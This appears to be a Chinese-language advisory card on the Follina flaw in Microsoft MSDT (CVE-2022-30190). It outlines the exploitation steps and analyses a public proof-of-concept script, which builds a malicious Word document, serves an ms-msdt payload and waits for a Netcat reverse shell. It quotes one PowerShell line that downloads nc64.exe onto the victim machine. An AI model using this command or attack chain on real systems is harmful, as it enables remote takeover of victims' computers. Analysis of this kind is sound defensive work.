## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开恶意构造的文档（例如 Word 文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 中的远程代码执行漏洞，当 MSDT 通过 URL 协议从调用应用程序（如 Word）调用时，会触发此漏洞。攻击者可以利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。该HTML文件中包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，从而执行任意命令。

**利用方式:**

1.  **恶意文档制作:** 攻击者创建一个恶意的 Word 文档，该文档包含指向远程 Web 服务器的链接，该服务器托管着包含恶意 JavaScript 代码的 HTML 文件。
2.  **HTTP服务器:** 攻击者搭建一个 HTTP 服务器，用于托管恶意的 HTML 文件，该文件利用 `ms-msdt:` 协议执行命令。
3.  **诱骗用户打开文档:** 攻击者通过鱼叉式网络钓鱼等方式诱骗受害者打开恶意 Word 文档。
4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)